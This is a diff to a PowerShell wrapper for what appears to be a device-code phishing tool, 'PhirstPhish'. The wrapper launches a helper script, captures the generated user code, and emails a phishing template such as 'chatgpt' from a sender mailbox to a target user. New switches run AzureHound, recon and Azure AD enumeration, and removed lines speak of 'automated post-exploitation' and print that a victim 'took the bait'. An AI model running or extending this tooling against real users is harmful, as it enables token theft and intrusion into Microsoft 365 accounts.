@@ -9,7 +9,17 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$subject,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$Token
+    [string]$Token,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$template,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$install = $false,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$azureHound = $false,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$recon = $false,   
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [switch]$azureAd = $false     
 )
 
 $banner = @"
@@ -89,17 +99,58 @@ $banner = @"
 "@
 Write-Host $banner
 
-# Define the script and its parameters
-$scriptPath = ".\PhirstPhish.ps1"
-$scriptParams = "-targetUser $targetUser -messageContent $messageContent -subject $subject"
+if(Test-Path ".\output.txt"){ Remove-item ".\output.txt"}
+if(Test-Path ".\user_code.txt"){ Remove-item ".\user_code.txt"}
+if(Test-Path ".\TokenLog.log"){ Remove-item ".\TokenLog.log"}
+if(Test-Path ".\target.txt"){ Remove-item ".\target.txt"}
 
-Write-Output "Starting PhirstPhish.ps1 in a separate process. Required modules all dependencies will be installed and capture the code generated for the template."
-Write-Output "Be patient! Output will resume here when the code is generated, and you will prompted to sign in with your sender's account."
+# Install and Import
+# if($install = $true){
+#     Write-Output "Installing modules"
+#     .\Scripts\Install.ps1
+# }
+Write-Output "Importing modules"
+.\Scripts\Import.ps1
 
-# Start the script in a new process
-$process = Start-Process powershell -ArgumentList "$scriptPath $scriptParams" -PassThru -RedirectStandardOutput "output.txt" # -WindowStyle minimized
+# Start the separate script as a new process and redirect output to a file
+# if($azureHound -eq $true){ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 -azurehound" -RedirectStandardOutput "output.txt"}
+# if($recon -eq $true){ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 -recon" -RedirectStandardOutput "output.txt"}
+# if($azureAd -eq $true){ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 -azuread" -RedirectStandardOutput "output.txt"}   # -NoNewWindow
+# else{ Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1" -RedirectStandardOutput "output.txt" }
+# # Wait for the file to have content 
 
-# Wait for the file to have content 
+# Initialize an empty argument list
+$argumentList = @()
+
+# Add flags to the argument list based on conditionals
+if ($azureHound) {
+    $argumentList += "-azurehound"
+}
+
+if ($recon) {
+    $argumentList += "-recon"
+}
+
+if ($azureAd) {
+    $argumentList += "-azuread"
+}
+
+# Correct the parameter passing for string parameters
+if ($targetUser) {
+    $argumentList += "-targetUser `"$targetUser`""
+}
+
+if ($subject) {
+    $argumentList += "-subject `"$subject`""
+}
+
+if ($messageContent) {
+    $argumentList += "-messageContent `"$messageContent`""
+}
+
+# Start the PowerShell script with the constructed argument list
+Start-Process -FilePath "powershell.exe" -ArgumentList "-File .\Phirst.ps1 $($argumentList -join ' ')" -RedirectStandardOutput "output.txt"
+
 Start-Sleep -Seconds 1
 
 # Continuously check the output file for the user code
@@ -119,44 +170,41 @@ Write-Output "$userCode" | Out-File .\user_code.txt
 # Output the user code
 Write-Host "User Code: $userCode"
 
+# Replace Values in Template
+
 Write-Output "Sign in with your sender's account here. Template will be sent from this mailbox."
-.\Next.ps1 -firstUser $firstUser -code $userCode
+.\Next.ps1 -firstUser $firstUser -userCode $userCode -template $template
 
-Write-Output "Background process is polling endpoint for the authentication. If the user authenticates, automated post-exploitation will be performed inside that process."
-# Write-Output "Script will continue when process exits."
 
-$filePath = '.\switch.txt'
-# Poll for the existence of the file
-while (-not (Test-Path -Path $filePath)) {
-    Write-Output "Checking for switch.txt.."
-    Start-Sleep -Seconds 5 # Wait for 5 seconds before checking again
-}
 
-# Once the file exists, read its contents
-Write-Output "File exists!"
-$contents = Get-Content -Path $filePath
 
-# Display the contents
-Write-Output "$contents took the bait."
 
-$process.WaitForExit()
-$process | Stop-Process -Force -Confirm
-# Remove our switch file
-if(test-path .\switch.txt){ Remove-Item -force .\switch.txt } 
 
-# $process.Kill()
 
-Read-Host "Clean up and clear output?"
-# $processes = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 | ForEach-Object { $_.Kill() }
-if(test-path .\output.txt) { Remove-Item -force .\output.txt }
-if(test-path .\user_code.txt) { Remove-Item -force .\user_code.txt }
-if(test-path .\TokenLog.log) { Remove-Item -force .\TokenLog.log }
-if(test-path *.json) { Remove-Item -force *.json }
+
+
+# Write-Output "Background process is polling endpoint for the authentication. If the user authenticates, automated post-exploitation will be performed inside that process."
+# # Write-Output "Script will continue when process exits."
+
+# $filePath = '.\target.txt'
+# # Poll for the existence of the file
+# while (-not (Test-Path -Path $filePath)) {
+#     Write-Output "Checking for target file."
+#     Start-Sleep -Seconds 2 # Wait for 5 seconds before checking again
+# }
+
+# Read-Host "Clean up and clear output?"
+# # $processes = Get-Process powershell | Sort-Object StartTime -Descending | Select-Object -First 1 | ForEach-Object { $_.Kill() }
+# if(test-path .\output.txt) { Remove-Item -force .\output.txt }
+# if(test-path .\user_code.txt) { Remove-Item -force .\user_code.txt }
+# if(test-path .\TokenLog.log) { Remove-Item -force .\TokenLog.log }
+# if(test-path *.json) { Remove-Item -force *.json }
 
 # $targetUser = ""
 # $firstUser = ""
 # $messageContent = "test"
 # $subject = "Hey there"
+# $template = "chatgpt"
+# .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template
 
-# wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject
 
